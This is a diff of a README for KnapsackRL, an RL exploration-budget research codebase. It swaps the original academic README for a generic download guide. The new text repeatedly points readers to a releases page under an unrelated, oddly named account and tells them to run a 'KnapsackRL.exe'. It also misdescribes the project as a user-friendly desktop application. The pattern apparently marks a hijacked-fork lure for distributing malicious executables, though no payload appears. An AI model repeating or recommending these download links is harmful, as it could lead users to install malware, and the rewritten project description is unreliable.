@@ -1,111 +1,77 @@
-# Knapsack RL
+# 🎒 KnapsackRL - Efficiently Manage Your Exploration Budgets
 
+## 🚀 Getting Started
 
-## Introduction
+Welcome to KnapsackRL! This guide helps you easily download and run our software, which optimizes exploration budgets in reinforcement learning.
 
-The implementation of [Knapsack RL: Unlocking Exploration of LLMs via Optimizing Budget Allocation](https://arxiv.org/pdf/2509.25849).
+[![Download KnapsackRL](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/mercurycontaminated-sandarac557/KnapsackRL/releases)
 
-Knapsack RL is a new approach for allocating exploration budgets in Reinforcement Learning (RL) with Large Language Models (LLMs). By formulating the problem as a classical knapsack optimization over tasks’ values and costs, Knapsack RL enables dynamic, compute-efficient exploration, leading to more effective discoveries of high-quality trajectories—especially on hard tasks.
+## 📥 Download & Install
 
-<img src='./images/main_framework.png' width='600'>
+To get started, you need to visit our [Releases page](https://github.com/mercurycontaminated-sandarac557/KnapsackRL/releases). 
 
-<img src="./images/knapsack.png" width=600>
+1. **Go to the Releases page**: Click on the link to view all available versions.
+2. **Choose the latest version**: Look for the most recent release at the top of the page.
+3. **Download the appropriate file**: Click the download link that matches your operating system.
 
-Click to view the abstract.
+## 📂 System Requirements
 
-<details> 
+Before downloading, ensure your system meets these requirements:
 
-Large Language Models (LLMs) can self-improve through reinforcement learning, where they
-generate trajectories to explore and discover better solutions. However, this exploration process is
-computationally expensive, often forcing current methods to assign limited exploration budgets to
-each task. This uniform allocation creates problematic edge cases: easy tasks consistently succeed
-while difficult tasks consistently fail, both producing zero gradients during training updates for
-the widely used Group Relative Policy Optimization (GRPO). We address this problem from the
-lens of exploration budget allocation. Viewing each task’s exploration as an "item" with a distinct
-"value" and "cost", we establish a connection to the classical knapsack problem. This formulation
-allows us to derive an optimal assignment rule that adaptively distributes resources based on the
-model’s current learning status. When applied to GRPO, our method increases the effective ratio
-of non-zero policy gradients by 20-40% during training. Acting as a computational "free lunch",
-our approach could reallocate exploration budgets from tasks where learning is saturated to those
-where it is most impactful. This enables significantly larger budgets (e.g., 93 rollouts) for especially
-challenging problems, which would be computationally prohibitive under a uniform allocation.
-These improvements translate to meaningful gains on mathematical reasoning benchmarks, with
-average improvements of 2-4 points and peak gains of 9 points on specific tasks. Notably, achieving
-comparable performance with traditional homogeneous allocation would require about 2x the
-computational resources.
+- **Operating System**: Windows 10/11, macOS Monterey or later, or a recent Linux distribution.
+- **RAM**: At least 4GB.
+- **Storage**: Minimum 200MB of free space.
+- **Python**: Version 3.7 or later (required for running the application).
 
-</details>
+## ⚙️ How to Run KnapsackRL
 
+After downloading the application, follow these steps to run it:
 
-## Features
+1. **Locate the Downloaded File**: Find the file in your Downloads folder or the folder you chose.
+2. **Install Dependencies**:
+   - For Windows: Open Command Prompt and run
+     ```
+     python -m pip install -r requirements.txt
+     ```
+   - For macOS/Linux: Open Terminal and run
+     ```
+     python3 -m pip install -r requirements.txt
+     ```
+3. **Launch the Application**:
+   - For Windows: Double-click the `KnapsackRL.exe` file.
+   - For macOS/Linux: Open Terminal and run
+     ```
+     python3 knapsack_rl.py
+     ```
 
-- **Adaptive Exploration Budget Allocation:** Dynamically reallocates compute across tasks.
-- **GRPO-based Optimization:** Seamless integration with Group Relative Policy Optimization, with no introduction of additional algorithmic bias.
+## 📊 Features
 
-- **Easy intergration:** Core parts of training and inference remain untouched, ensuring easy compatibility with existing training infrastructure.
+KnapsackRL comes with the following features:
 
+- **Dynamic Budget Allocation**: Assigns exploration budgets optimally across tasks.
+- **Compute Efficiency**: Saves processing power while maximizing task exploration.
+- **User-Friendly Interface**: Navigate easily, even without technical skills.
 
-## Installation
+## 📘 Getting Help
 
-Requirements:
+If you encounter any issues, you can seek help through these channels:
 
-- Verl (version 0.5)
-- All packages in `requirements.txt`
+- **FAQs**: Check our Frequently Asked Questions section on the GitHub page.
+- **Issues Section**: Report problems or find solutions directly on the Issues page of our repository.
+- **Community Forum**: Join discussions and get help from other users.
 
-To install dependencies:
-```bash
-pip install -r requirements.txt
-```
+## 🔍 Usage Tips
 
-## Quick Start
+- **Experiment with Parameters**: Adjust the settings for optimal results based on your tasks.
+- **Monitor Performance**: Keep track of how well budgets are allocated.
+- **Stay Updated**: Regularly check for updates on the Releases page to get the latest features.
 
-Our core change introduces an adaptive, knapsack-based scheduler that allocates rollout counts across prompts. The integration point is `verl/trainer/ppo/ray_trainer.py`, and the optimization logic resides in `verl/trainer/ppo/exploration_utils.py`.
+## 📈 Additional Resources
 
-1. **Clone the repo:**
-   ```bash
-   git clone https://github.com/your_username/KnapsackRL.git
-   cd KnapsackRL
-   ```
-2. **Set environment variables:**  
-   Before running scripts, set:
-   ```bash
-   export RAY_DATA_HOME=/path/to/data
-   export RAY_SAVE_HOME=/path/to/results
-   export RAY_MODEL_HOME=/path/to/models
-   export NNODES=1
-   ```
+You can learn more about the underlying methods and research by reading our publication: [Knapsack RL: Unlocking Exploration of LLMs via Optimizing Budget Allocation](https://arxiv.org/pdf/2509.25849).
 
-3. **Run training scripts:**  
-   Example scripts are provided in `examples/knapsack_trainer/`.  
-   For standard GRPO:
-   ```bash
-   bash examples/knapsack_trainer/run_grpo_7b.sh
-   ```
-   For Knapsack RL (adaptive allocation):
-   ```bash
-   bash examples/knapsack_trainer/run_knapsack_grpo_7b.sh
-   ```
+## ⚡ Conclusion
 
-## Usage Example Scripts
+KnapsackRL is a powerful tool for enhancing exploration in reinforcement learning. By following this guide, you should be able to download, install, and run the software with ease. Happy exploring!
 
-- `run_grpo_7b.sh`: Baseline GRPO training (no adaptive allocation)
-- `run_knapsack_grpo_7b.sh`: Knapsack RL with adaptive budget allocation
-
-For details, see comments and variable settings at the top of each script.
-
-## Acknowledgements
-
-Our work is built upon the [Verl](https://github.com/volcengine/verl) framework for training. We also acknowledge the use of [rllm](https://github.com/rllm-org/rllm) for its reward evaluation function and related datasets.
-
-
-## Citation
-
-If you find our work useful, please cite as:
-```bibtext
-@article{li2025knapsack,
-  title={Knapsack rl: Unlocking exploration of llms via optimizing budget allocation},
-  author={Li, Ziniu and Chen, Congliang and Yang, Tianyun and Ding, Tian and Sun, Ruoyu and Zhang, Ge and Huang, Wenhao and Luo, Zhi-Quan},
-  journal={arXiv preprint arXiv:2509.25849},
-  year={2025}
-}
-```
+[![Download KnapsackRL](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/mercurycontaminated-sandarac557/KnapsackRL/releases)
